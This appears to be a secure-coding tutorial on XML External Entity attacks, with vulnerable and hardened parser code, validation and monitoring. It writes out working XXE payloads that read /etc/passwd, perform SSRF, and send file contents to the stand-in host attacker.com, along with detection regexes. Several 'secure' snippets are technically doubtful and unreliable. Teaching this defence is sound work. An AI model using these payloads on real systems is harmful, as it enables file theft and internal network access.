# XML External Entities (XXE)

## 📚 Overview

XML External Entity (XXE) attacks exploit vulnerabilities in XML parsers that process external entity references. Attackers can use XXE to read local files, perform server-side request forgery (SSRF), scan internal networks, and in some cases execute remote code.

## 🎯 What is XXE?

XXE attacks occur when XML parsers process external entity references without proper restrictions. External entities allow XML documents to reference data from external sources, which attackers can exploit to access sensitive information or perform unauthorized actions.

### How XXE Works

1. **External Entity Declaration**: Attacker declares an external entity
2. **Entity Reference**: Entity is referenced in the XML document
3. **Parser Processing**: XML parser resolves and processes the entity
4. **Data Access**: Attacker gains access to sensitive data or performs actions

## 🔍 XXE Attack Vectors

### File Read Attack

```xml
<!-- XXE Payload - Read local file -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### Network-Based Attack

```xml
<!-- XXE Payload - SSRF attack -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server.local/admin">
]>
<foo>&xxe;</foo>
```

### Blind XXE Attack

```xml
<!-- XXE Payload - Out-of-band data exfiltration -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY callhome SYSTEM "http://attacker.com/?data=%xxe;">
]>
<foo>&callhome;</foo>
```

## 🔍 Vulnerable XML Parsing

### Vulnerable Code - Node.js

```javascript
// VULNERABLE CODE - No XXE protection
const xml2js = require('xml2js');
const parser = new xml2js.Parser();

app.post('/api/parse-xml', (req, res) => {
  parser.parseString(req.body.xml, (err, result) => {
    if (err) {
      return res.status(400).json({ error: 'Invalid XML' });
    }
    res.json(result); // Vulnerable to XXE!
  });
});
```

### Vulnerable Code - Python

```python
# VULNERABLE CODE - No XXE protection
import xml.etree.ElementTree as ET

def parse_xml(xml_string):
    tree = ET.parse(xml_string)  # Vulnerable to XXE!
    return tree
```

### Vulnerable Code - Java

```java
// VULNERABLE CODE - No XXE protection
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(xmlInput); // Vulnerable to XXE!
```

## 🛡️ Secure XML Parsing

### Secure Code - Node.js

```javascript
// SECURE CODE - Disable external entities
const xml2js = require('xml2js');
const libxmljs = require('libxmljs');

app.post('/api/parse-xml', (req, res) => {
  try {
    // Option 1: Use libxmljs with security options
    const doc = libxmljs.parseXmlString(req.body.xml, {
      noent: false, // Disable entity expansion
      noblanks: true,
      network: false // Disable network access
    });
    
    res.json(doc.toString());
  } catch (error) {
    res.status(400).json({ error: 'Invalid XML' });
  }
});

// Option 2: Use xml2js with DOMPurify
const DOMPurify = require('isomorphic-dompurify');

app.post('/api/parse-xml', (req, res) => {
  // Sanitize XML before parsing
  const sanitized = DOMPurify.sanitize(req.body.xml, {
    ALLOWED_TAGS: [],
    ALLOWED_ATTR: []
  });
  
  const parser = new xml2js.Parser({
    explicitCharkey: true,
    trim: true,
    normalize: true,
    explicitRoot: false,
    ignoreAttrs: false,
    mergeAttrs: false,
    validator: null,
    xmlns: false,
    explicitNamespaces: false,
    stripPrefix: false,
    async: false
  });
  
  parser.parseString(sanitized, (err, result) => {
    if (err) {
      return res.status(400).json({ error: 'Invalid XML' });
    }
    res.json(result);
  });
});
```

### Secure Code - Python

```python
# SECURE CODE - Disable external entities
from defusedxml import ElementTree

def parse_xml(xml_string):
    # defusedxml prevents XXE by default
    tree = ElementTree.parse(xml_string)
    return tree

# Alternative: Use lxml with restrictions
from lxml import etree

def parse_xml_secure(xml_string):
    parser = etree.XMLParser(
        resolve_entities=False,  # Disable entity resolution
        no_network=True,  # Disable network access
        huge_tree=False  # Limit tree size
    )
    tree = etree.parse(xml_string, parser)
    return tree
```

### Secure Code - Java

```java
// SECURE CODE - Disable external entities
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.XMLConstants;

DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

// Disable external entities
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setExpandEntityReferences(false);
factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);

DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(xmlInput);
```

## 🔍 Prevention Strategies

### 1. Disable DOCTYPE Declarations

```javascript
// Disable DOCTYPE declarations
function sanitizeXML(xmlString) {
  // Remove DOCTYPE declarations
  return xmlString.replace(/<!DOCTYPE[^>]*>/gi, '');
}

app.post('/api/parse-xml', (req, res) => {
  const sanitized = sanitizeXML(req.body.xml);
  // Parse sanitized XML
});
```

### 2. Use JSON Instead of XML

```javascript
// Prefer JSON over XML when possible
app.post('/api/data', (req, res) => {
  // Accept JSON instead of XML
  const data = req.body; // JSON by default
  res.json({ success: true, data });
});
```

### 3. Whitelist Allowed Elements

```javascript
// Whitelist approach
const allowedElements = ['user', 'name', 'email'];
const allowedAttributes = ['id', 'type'];

function validateXML(xmlString) {
  const parser = new DOMParser();
  const doc = parser.parseFromString(xmlString, 'text/xml');
  
  // Check for parse errors
  const parserError = doc.querySelector('parsererror');
  if (parserError) {
    throw new Error('Invalid XML');
  }
  
  // Validate all elements
  const allElements = doc.getElementsByTagName('*');
  for (const element of allElements) {
    if (!allowedElements.includes(element.tagName)) {
      throw new Error(`Disallowed element: ${element.tagName}`);
    }
    
    // Validate attributes
    for (const attr of element.attributes) {
      if (!allowedAttributes.includes(attr.name)) {
        throw new Error(`Disallowed attribute: ${attr.name}`);
      }
    }
  }
  
  return doc;
}
```

### 4. Input Validation

```javascript
// Validate XML structure before parsing
function validateXMLStructure(xmlString) {
  // Check for external entity references
  if (xmlString.includes('<!ENTITY') || xmlString.includes('SYSTEM')) {
    throw new Error('External entity references not allowed');
  }
  
  // Check for DOCTYPE
  if (xmlString.includes('<!DOCTYPE')) {
    throw new Error('DOCTYPE declarations not allowed');
  }
  
  // Check size limits
  if (xmlString.length > 100000) {
    throw new Error('XML too large');
  }
  
  return true;
}
```

## 🔍 XXE in Different Contexts

### XXE in File Upload

```javascript
// SECURE CODE - Validate uploaded XML files
const multer = require('multer');
const upload = multer({ dest: 'uploads/' });

app.post('/api/upload-xml', upload.single('xmlfile'), (req, res) => {
  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }
  
  // Read file content
  const xmlContent = fs.readFileSync(req.file.path, 'utf8');
  
  // Validate XML structure
  if (!validateXMLStructure(xmlContent)) {
    fs.unlinkSync(req.file.path); // Delete uploaded file
    return res.status(400).json({ error: 'Invalid XML structure' });
  }
  
  // Parse with secure parser
  const result = parseXMLSecure(xmlContent);
  
  // Clean up
  fs.unlinkSync(req.file.path);
  
  res.json(result);
});
```

### XXE in SOAP Services

```javascript
// SECURE CODE - Secure SOAP parsing
const soap = require('soap');

const wsdlOptions = {
  disableCache: true,
  strict: true,
  // Disable external entity resolution
  wsdl_options: {
    xmlParseOptions: {
      noent: false,
      network: false
    }
  }
};

const soapServer = soap.createServer(wsdlPath, wsdlOptions);
```

## 📊 XXE Detection

### Testing for XXE

```javascript
// XXE test payloads
const xxeTestPayloads = [
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/test">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY callhome SYSTEM "http://attacker.com/?%xxe;">]><foo>&callhome;</foo>'
];

// Test function
async function testXXE(xmlPayload) {
  try {
    const response = await fetch('/api/parse-xml', {
      method: 'POST',
      headers: { 'Content-Type': 'application/xml' },
      body: xmlPayload
    });
    
    const result = await response.text();
    
    // Check for sensitive data in response
    if (result.includes('root:') || result.includes('/bin/bash')) {
      console.log('XXE vulnerability detected!');
      return true;
    }
    
    return false;
  } catch (error) {
    console.error('Error testing XXE:', error);
    return false;
  }
}
```

## 🛡️ Best Practices

### 1. Use Safe Parsers

- Use parsers that disable external entities by default
- Configure parsers with security options
- Keep parsers updated

### 2. Input Validation

- Validate XML structure before parsing
- Reject DOCTYPE declarations
- Reject external entity references
- Limit XML size

### 3. Output Encoding

```javascript
// Encode output to prevent injection
function encodeXMLOutput(data) {
  return data
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&apos;');
}
```

### 4. Prefer JSON

- Use JSON instead of XML when possible
- JSON doesn't support external entities
- Simpler and safer

### 5. Network Restrictions

- Disable network access in XML parsers
- Block outbound connections
- Monitor for suspicious network activity

## 📊 Monitoring and Detection

```javascript
// Monitor for XXE attempts
function logXXEAttempt(xmlInput, ipAddress) {
  const indicators = [
    /<!ENTITY/i,
    /SYSTEM\s+["']file:/i,
    /SYSTEM\s+["']http:/i,
    /<!DOCTYPE/i
  ];
  
  for (const indicator of indicators) {
    if (indicator.test(xmlInput)) {
      logger.warn('Potential XXE attack detected', {
        ipAddress,
        timestamp: Date.now(),
        xmlPreview: xmlInput.substring(0, 200)
      });
      
      // Alert security team
      sendSecurityAlert({
        type: 'xxe_attempt',
        ipAddress,
        severity: 'high'
      });
      
      return true;
    }
  }
  
  return false;
}
```

## 🎯 Best Practices

1. **Disable External Entities**: Configure parsers to disable external entities
2. **Disable DOCTYPE**: Reject DOCTYPE declarations
3. **Input Validation**: Validate XML structure before parsing
4. **Use Safe Parsers**: Use parsers with security features
5. **Network Restrictions**: Disable network access in parsers
6. **Prefer JSON**: Use JSON instead of XML when possible
7. **Monitoring**: Monitor for XXE attempts

## 🎓 Learning Resources

- OWASP XXE: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
- XXE Prevention: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- XML Security: https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html

---

**Next**: Learn about [Broken Access Control](./BROKEN-ACCESS-CONTROL.md)

